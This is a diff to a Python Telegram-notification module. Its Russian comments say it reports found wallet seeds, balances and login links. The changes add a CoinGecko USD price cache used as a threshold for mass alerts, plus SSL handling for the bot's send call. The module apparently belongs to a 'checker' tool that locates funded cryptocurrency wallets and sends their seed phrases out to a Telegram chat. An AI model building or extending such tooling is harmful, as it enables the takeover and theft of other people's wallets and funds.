@@ -1,5 +1,9 @@
 # Telegram-уведомления: "НАЙДЕНО" → пользователь, сид, баланс, ссылка на кошелёк (вход/баланс).
-import json, urllib.parse, urllib.request
+import json, ssl, time, urllib.parse, urllib.request
+try:
+    import certifi; _CTX = ssl.create_default_context(cafile=certifi.where())   # CA для HTTPS (на сервере нет /etc/ssl/certs)
+except Exception:
+    _CTX = ssl.create_default_context()
 TOKEN = CHAT = None
 try:
     import keys as _k
@@ -10,6 +14,31 @@ except Exception:
 
 def enabled():
     return bool(TOKEN and CHAT)
+
+# --- цены USD (CoinGecko, кэш 10 мин) для порога масс-уведомлений ---
+_PRICES = {"t": 0.0, "p": {}}
+_CG = {"bitcoin": "BTC", "ethereum": "ETH", "litecoin": "LTC", "dogecoin": "DOGE", "dash": "DASH", "ethereum-classic": "ETC"}
+
+def prices():
+    now = time.time()
+    if now - _PRICES["t"] < 600 and _PRICES["p"]:
+        return _PRICES["p"]
+    try:
+        url = "https://api.coingecko.com/api/v3/simple/price?ids=" + ",".join(_CG.keys()) + "&vs_currencies=usd"
+        req = urllib.request.Request(url, headers={"User-Agent": "puh-checker"})
+        with urllib.request.urlopen(req, timeout=12, context=_CTX) as r:
+            d = json.loads(r.read().decode("utf-8", "replace"))
+        _PRICES["p"] = {sym: (d.get(cid) or {}).get("usd", 0) for cid, sym in _CG.items()}
+        _PRICES["t"] = now
+    except Exception:
+        pass
+    return _PRICES["p"]
+
+def usd(coin, bal):                       # USD-оценка баланса (EVM считаем по ETH — грубо, но не пропустим)
+    try:
+        return float(bal) * (prices().get(coin, 0) or 0)
+    except Exception:
+        return 0.0
 
 def _esc(s):
     return (str(s)).replace("&", "&amp;").replace("<", "&lt;").replace(">", "&gt;")
@@ -31,7 +60,7 @@ def send(text):
         data = urllib.parse.urlencode({"chat_id": CHAT, "text": text, "parse_mode": "HTML",
                                        "disable_web_page_preview": "true"}).encode()
         req = urllib.request.Request(f"https://api.telegram.org/bot{TOKEN}/sendMessage", data=data)
-        with urllib.request.urlopen(req, timeout=15) as r:
+        with urllib.request.urlopen(req, timeout=15, context=_CTX) as r:
             return r.status == 200
     except Exception:
         return False
